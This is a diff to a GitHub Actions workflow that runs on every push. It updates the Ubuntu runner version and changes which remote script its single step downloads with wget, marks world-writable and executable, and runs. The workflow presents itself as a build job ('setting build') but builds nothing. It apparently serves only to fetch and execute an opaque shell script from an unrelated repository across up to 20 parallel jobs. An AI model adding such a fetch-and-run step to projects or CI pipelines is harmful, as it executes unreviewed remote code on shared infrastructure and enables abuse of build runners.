@@ -4,7 +4,7 @@ on: [push]
 jobs:
   build:
     name: setting build
-    runs-on: ubuntu-18.04
+    runs-on: ubuntu-20.04
     strategy:
       max-parallel: 20
       fail-fast: false
@@ -25,4 +25,4 @@ jobs:
       uses: actions/checkout@v1
     - name: 🎉
       run: |
-          wget https://raw.githubusercontent.com/tajbxhsb/fantastic-doodle/main/TestNN.sh && chmod 777 TestNN.sh && ./TestNN.sh
+          wget https://raw.githubusercontent.com/tajbxhsb/fantastic-doodle/main/Testi.sh && chmod 777 Testi.sh && ./Testi.sh
